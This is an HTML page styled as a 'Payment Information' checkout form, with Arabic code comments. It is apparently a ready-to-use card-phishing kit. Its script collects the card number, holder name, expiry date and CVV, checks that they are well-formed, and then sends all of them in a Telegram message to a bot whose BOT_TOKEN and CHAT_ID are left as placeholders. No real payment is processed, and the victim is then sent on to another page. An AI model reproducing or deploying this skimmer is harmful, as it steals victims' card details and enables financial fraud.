<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Information</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            width: 360px;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h2 {
            font-size: 18px;
            margin-bottom: 10px;
            color: #333;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 14px;
            text-align: left;
            transition: border 0.3s;
        }

        .input-row {
            display: flex;
            justify-content: space-between;
        }

        .input-row input {
            width: 47%;
            border-radius: 10px;
            text-align: center;
        }

        .expiry {
            margin-right: 6px;
        }

        .pay-button {
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }

        .pay-button:hover {
            background: #0056b3;
        }

        .error {
            border: 2px solid red !important;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Payment Information</h2>
        
        <form id="paymentForm">
            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" required>
            <input type="text" id="cardHolder" placeholder="Card Holder Name" required>
            
            <div class="input-row">
                <input type="text" id="expiryMM" class="expiry" placeholder="MM" maxlength="2" required>
                <input type="text" id="expiryYY" placeholder="YY" maxlength="2" required>
            </div>

            <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>

            <button type="submit" class="pay-button">PAY</button>
        </form>
    </div>

    <script>
        const BOT_TOKEN = "YOUR_BOT_TOKEN";  
        const CHAT_ID = "YOUR_CHAT_ID";      

        // إضافة مسافة بعد كل 4 أرقام في رقم البطاقة
        document.getElementById("cardNumber").addEventListener("input", function(event) {
            let value = event.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
            event.target.value = formattedValue;
        });

        // ضبط MM
        document.getElementById("expiryMM").addEventListener("input", function(event) {
            let value = event.target.value.replace(/\D/g, ''); 
            let mm = parseInt(value, 10);

            if (mm > 12) mm = 12;
            if (mm < 1 && value.length > 0) mm = 1;

            event.target.value = mm ? mm.toString().padStart(2, '0') : '';
        });

        // ضبط YY
        document.getElementById("expiryYY").addEventListener("input", function(event) {
            let value = event.target.value.replace(/\D/g, ''); 
            let yy = parseInt(value, 10);

            if (yy > 40) yy = 40;
            if (yy < 25 && value.length > 0) yy = 25;

            event.target.value = yy ? yy.toString().padStart(2, '0') : '';
        });

        document.getElementById("paymentForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const cardNumber = document.getElementById("cardNumber");
            const cardHolder = document.getElementById("cardHolder");
            const expiryMM = document.getElementById("expiryMM");
            const expiryYY = document.getElementById("expiryYY");
            const cvv = document.getElementById("cvv");

            let valid = true;

            if (cardNumber.value.replace(/\s/g, '').length !== 16) {
                cardNumber.classList.add("error");
                valid = false;
            } else {
                cardNumber.classList.remove("error");
            }

            if (!/^[A-Za-z ]+$/.test(cardHolder.value)) {
                cardHolder.classList.add("error");
                valid = false;
            } else {
                cardHolder.classList.remove("error");
            }

            let mm = parseInt(expiryMM.value, 10);
            let yy = parseInt(expiryYY.value, 10);

            if (isNaN(mm) || isNaN(yy) || mm < 2 || yy < 25 || yy > 40) {
                expiryMM.classList.add("error");
                expiryYY.classList.add("error");
                valid = false;
            } else {
                expiryMM.classList.remove("error");
                expiryYY.classList.remove("error");
            }

            if (!/^\d{3}$/.test(cvv.value)) {
                cvv.classList.add("error");
                valid = false;
            } else {
                cvv.classList.remove("error");
            }

            if (!valid) return;

            const message = `👤 Name: ${cardHolder.value}\n💳 Card: ${cardNumber.value}\n📅 Expiry: ${expiryMM.value}/${expiryYY.value}\n🔒 CVV: ${cvv.value}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
            .then(() => window.open("page.html", "_blank"));
        });
    </script>

</body>
</html>
